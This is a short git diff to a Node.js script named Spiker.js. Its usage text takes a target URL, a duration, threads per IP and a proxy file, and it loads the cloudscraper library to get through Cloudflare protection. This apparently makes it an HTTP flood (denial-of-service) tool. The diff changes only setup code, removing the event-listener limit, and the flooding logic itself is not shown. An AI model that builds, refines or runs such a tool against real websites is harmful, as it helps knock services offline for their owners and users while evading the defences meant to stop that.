@@ -22,8 +22,10 @@
  * SOFTWARE.
  */
 
+require('events').EventEmitter.defaultMaxListeners = 0;
+
 if (process.argv.length <= 5) {
-	console.log(`Made by Tesla.
+    console.log(`Made by Tesla.
 Usage: node Spiker.js <url> <time> <threads_per_ip> <proxies>
 Usage: node Spiker.js <http://example.com> <60> <100> <http.txt>`);
     process.exit(-1);
@@ -31,13 +33,10 @@ Usage: node Spiker.js <http://example.com> <60> <100> <http.txt>`);
 
 let fs = require('fs'),
     CloudScraper = require('cloudscraper'),
-    EventEmitter = require('events'),
-    emitter = new EventEmitter(),
     target = process.argv[2],
     time = process.argv[3],
     threads = process.argv[4],
     proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);
-emitter.setMaxListeners(Number.POSITIVE_INFINITY);
 
 let getHeaders = new Promise(function (resolve, reject) {
     CloudScraper({
